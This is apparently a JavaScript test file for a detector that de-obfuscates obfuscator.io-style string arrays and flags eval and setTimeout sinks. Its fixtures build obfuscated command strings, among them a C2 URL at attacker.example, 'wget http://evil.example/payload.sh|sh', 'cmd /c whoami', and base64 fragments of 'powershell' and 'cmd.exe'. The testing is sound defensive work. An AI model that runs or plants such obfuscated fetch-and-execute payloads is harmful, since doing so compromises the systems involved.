'use strict';
// js-assembly.test.js — JS string-array obfuscation resolver
// (`obfuscator.io` / javascript-obfuscator npm package shape).
//
// `_findJsStringArrayCandidates(text, context)` finds the canonical
// three-piece shape (string-array literal + indexer function + sink call)
// and emits a `cmd-obfuscation` candidate per resolvable sink, where
// `deobfuscated` is `<sinkName>(<JSON-encoded resolved arg>)`.
//
// These tests exercise:
//   * the trigger gate (must NOT fire on plain English / a short array
//     of unrelated strings);
//   * the canonical shape with `eval` + plain `arr[i]`;
//   * the offset variant (`arr[i - 0x1]`);
//   * `setTimeout(<expr>, <ms>)` first-arg-only resolution;
//   * the all-or-nothing concat policy (one unresolvable operand drops
//     the whole sink);
//   * the base64-shortcut trigger path (≥5 base64-looking entries with
//     fewer than 10 distinct strings still trips the gate).
//
// The harness loads the same minimal subset as `cmd-obfuscation.test.js`:
// constants + encoded-content-detector + the decoder-under-test mounted
// onto its prototype.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/js-assembly.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

/** Helper: project candidates across the vm realm into the host realm. */
function pickAll(candidates) {
  return host(candidates);
}

/** Build a synthetic obfuscator-shaped script:
 *   var ARR = ['e0', 'e1', ...];
 *   function IDX(i) { return ARR[i]; }
 *   <suffix>
 * `entries` is the literal array contents; `suffix` is the sink-call
 * tail. Names are fixed so the indexer regex hits deterministically. */
function buildScript(entries, suffix) {
  const arrLit = entries.map(s => "'" + s.replace(/'/g, "\\'") + "'").join(', ');
  return [
    "var _0xa1b2 = [" + arrLit + "];",
    "function _0xc3d4(i) { return _0xa1b2[i]; }",
    suffix,
  ].join('\n');
}

test('js-assembly: resolves canonical eval(<concat>) with plain arr[i]', () => {
  // 10 entries hits the MIN_ENTRIES gate. The sink concat reads
  // entries 0+1+2 and resolves to 'http://attacker.example/c2'.
  const entries = [
    'http://', 'attacker.example', '/c2',
    'log', 'warn', 'error', 'info', 'debug', 'trace', 'group',
  ];
  const text = buildScript(
    entries,
    "eval(_0xc3d4(0) + _0xc3d4(1) + _0xc3d4(2));",
  );
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.equal(candidates.length, 1, `expected 1 candidate, got ${JSON.stringify(candidates)}`);
  assert.equal(candidates[0].technique, 'JS String-Array Resolution');
  assert.equal(candidates[0].type, 'cmd-obfuscation');
  // The deobfuscated form is `<sinkName>(<JSON-of-resolved>)`.
  assert.equal(candidates[0].deobfuscated, 'eval("http://attacker.example/c2")');
});

test('js-assembly: indexer offset arr[i - 0x1] resolves correctly', () => {
  // Same entries, but the indexer subtracts 1 from every call argument.
  // So `IDX(0x1)` returns entries[0], etc.
  const entries = [
    'http://', 'attacker.example', '/c2',
    'log', 'warn', 'error', 'info', 'debug', 'trace', 'group',
  ];
  const arrLit = entries.map(s => "'" + s + "'").join(', ');
  const text = [
    "var _0xa1b2 = [" + arrLit + "];",
    // indexer with `i - 0x1` offset
    "function _0xc3d4(i) { return _0xa1b2[i - 0x1]; }",
    "eval(_0xc3d4(0x1) + _0xc3d4(0x2) + _0xc3d4(0x3));",
  ].join('\n');
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.equal(candidates.length, 1);
  assert.equal(candidates[0].deobfuscated, 'eval("http://attacker.example/c2")');
});

test('js-assembly: setTimeout takes only the first arg, ignores the delay', () => {
  // setTimeout(<expr>, <ms>) — the resolver must split on the top-level
  // comma and resolve only the first operand.
  const entries = [
    'wget ', 'http://', 'evil.example', '/payload.sh', '|sh',
    'log', 'warn', 'error', 'info', 'debug',
  ];
  const text = buildScript(
    entries,
    "setTimeout(_0xc3d4(0) + _0xc3d4(1) + _0xc3d4(2) + _0xc3d4(3) + _0xc3d4(4), 1000);",
  );
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.equal(candidates.length, 1);
  assert.equal(
    candidates[0].deobfuscated,
    'setTimeout("wget http://evil.example/payload.sh|sh")',
  );
});

test('js-assembly: all-or-nothing — one unresolvable operand drops the sink', () => {
  // The first sink call references an out-of-range index (entries[99]
  // doesn't exist), so the whole call must drop, even though entries
  // [0]+[1] would resolve. The second sink is entirely valid and must
  // still emit.
  const entries = [
    'AAAA', 'BBBB', 'CCCC',
    'http://', 'evil.example', '/x',
    'log', 'warn', 'error', 'info',
  ];
  const text = buildScript(
    entries,
    [
      "eval(_0xc3d4(0) + _0xc3d4(99) + _0xc3d4(2));",
      "eval(_0xc3d4(3) + _0xc3d4(4) + _0xc3d4(5));",
    ].join('\n'),
  );
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  // Exactly one candidate (the second eval). The first eval fails on
  // the out-of-range index and emits nothing.
  assert.equal(candidates.length, 1, `expected 1 candidate, got ${JSON.stringify(candidates)}`);
  assert.equal(candidates[0].deobfuscated, 'eval("http://evil.example/x")');
});

test('js-assembly: trigger gate — does not fire on plain English', () => {
  // No array literal, no indexer, no sinks. Must return [] cheaply.
  const text =
    'A perfectly ordinary paragraph of plain English with no obfuscation. ' +
    'It mentions eval as a word but does not call it. const COLOURS = ' +
    "['red', 'green', 'blue'];";
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.deepEqual(candidates, []);
});

test('js-assembly: trigger gate — short benign array does not fire', () => {
  // 3 entries, far below MIN_ENTRIES (10). No base64-looking entries.
  // Even though there's an indexer-shaped function and a sink, the
  // resolved-array gate inside the finder rejects this.
  const text = [
    "const COLOURS = ['red', 'green', 'blue'];",
    "function pick(i) { return COLOURS[i]; }",
    "eval(pick(0));",
  ].join('\n');
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.deepEqual(candidates, []);
});

test('js-assembly: base64-shortcut — 5+ base64-looking entries trip the gate', () => {
  // Only 6 entries (below MIN_ENTRIES=10), but 5 of them are base64-
  // shaped (length ≥8, alphabet conforms), which trips the
  // MIN_BASE64_LOOKING shortcut.
  const entries = [
    'cG93ZXJzaGVsbA==',     // base64-looking
    'aHR0cDovL2V2aWw=',     // base64-looking
    'L2NtZC5leGU=',         // base64-looking
    'd2dldCBodHRwOi8v',     // base64-looking
    'YmFzZTY0LWVuY29kZWQ=', // base64-looking
    'log',                  // not base64-looking (too short)
  ];
  const text = buildScript(
    entries,
    "eval(_0xc3d4(0));",
  );
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.equal(candidates.length, 1);
  // The resolved string is the first entry verbatim; the sink wraps it.
  assert.equal(candidates[0].deobfuscated, 'eval("cG93ZXJzaGVsbA==")');
});

test('js-assembly: empty / oversized input returns []', () => {
  assert.deepEqual(pickAll(d._findJsStringArrayCandidates('', {})), []);
  assert.deepEqual(pickAll(d._findJsStringArrayCandidates(null, {})), []);
  // 300 KB > MAX_SOURCE_BYTES (256 KB) — early return, no exception.
  const big = 'a'.repeat(300 * 1024);
  assert.deepEqual(pickAll(d._findJsStringArrayCandidates(big, {})), []);
});

test('js-assembly: literal string operand mixed with indexer call resolves', () => {
  // Real obfuscator output sometimes leaves a static literal mixed
  // into a concat (e.g. trailing `;` or a separator). The resolver
  // must accept string-literal operands alongside indexer calls.
  const entries = [
    'http://', 'evil.example',
    'log', 'warn', 'error', 'info', 'debug', 'trace', 'group', 'table',
  ];
  const text = buildScript(
    entries,
    "eval(_0xc3d4(0) + _0xc3d4(1) + '/path');",
  );
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.equal(candidates.length, 1);
  assert.equal(candidates[0].deobfuscated, 'eval("http://evil.example/path")');
});

test('js-assembly: candidate offsets locate the sink call in the source', () => {
  // The `offset` field must point at the start of the sink-name, and
  // `offset + length` at one past the closing `)`. This is what drives
  // the sidebar's click-to-focus on the deobfuscated finding.
  const entries = [
    'cmd ', '/c ', 'whoami',
    'log', 'warn', 'error', 'info', 'debug', 'trace', 'group',
  ];
  const text = buildScript(
    entries,
    "eval(_0xc3d4(0) + _0xc3d4(1) + _0xc3d4(2));",
  );
  const candidates = pickAll(d._findJsStringArrayCandidates(text, {}));
  assert.equal(candidates.length, 1);
  const c = candidates[0];
  // The slice [offset, offset+length] should be the full `eval(…)` call.
  const slice = text.substring(c.offset, c.offset + c.length);
  assert.match(slice, /^eval\(/);
  assert.match(slice, /\)$/);
});
